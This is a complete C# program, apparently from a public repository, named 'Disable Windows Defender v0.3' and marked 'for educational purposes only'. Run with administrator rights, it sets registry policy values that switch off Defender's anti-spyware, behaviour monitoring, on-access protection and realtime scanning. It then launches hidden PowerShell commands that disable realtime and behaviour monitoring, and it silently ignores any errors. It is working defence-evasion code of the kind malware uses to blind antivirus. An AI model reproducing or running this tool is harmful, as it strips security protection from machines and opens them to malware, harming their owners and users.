using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Disable Windows Defender v0.3
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only. 

namespace Disable_Windows_Defender
{
    class Program
    {
        static void Main()
        {

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable");

            Thread.Sleep(100);

            RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");

            Thread.Sleep(100);

            RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
        }

        private static void RegistryEdit(string regPath, string name)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath,RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, "00000001", RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)"00000001")
                        key.SetValue(name, "00000001",RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void RunPS(string args)
        {
            try
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "powershell.exe";
                ps.Arguments = args;
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = ps;
                process.Start();
            }
            catch { }
        }
    }
}
